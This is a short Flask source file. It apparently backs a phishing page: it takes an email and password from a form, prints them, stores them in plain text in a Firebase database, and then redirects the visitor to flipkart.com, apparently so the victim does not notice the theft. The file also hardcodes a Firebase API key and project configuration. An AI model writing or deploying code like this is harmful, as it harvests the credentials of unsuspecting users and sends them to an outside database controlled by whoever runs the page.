from flask import Flask, render_template, request, redirect, url_for
import pyrebase

app = Flask(__name__)


config = {
  "apiKey": "AIzaSyAfx13UgN97slT_zkLI3KZDQH5zL6tKE7Q",
  "authDomain": "random-d6983.firebaseapp.com",
  "databaseURL": "https://random-d6983.firebaseio.com",
  "projectId": "random-d6983",
  "storageBucket": "random-d6983.appspot.com",
  "messagingSenderId": "898747621857",
  "appId": "1:898747621857:web:9ffcffc74bcd89ca3b72a0",
  "measurementId": "G-H951SN5VCD"
}

firebase = pyrebase.initialize_app(config)



@app.route('/', methods=['GET', 'POST'])
def hello_world():
    if request.method=='POST':
        print(request.form['email'], request.form['pass'])
        db=firebase.database()
        data = {
            'email' : request.form['email'],
            'password' : request.form['pass']
        }
        db.child('User').set(data)
        return redirect('https://www.flipkart.com')
    else :
        return render_template('index.html')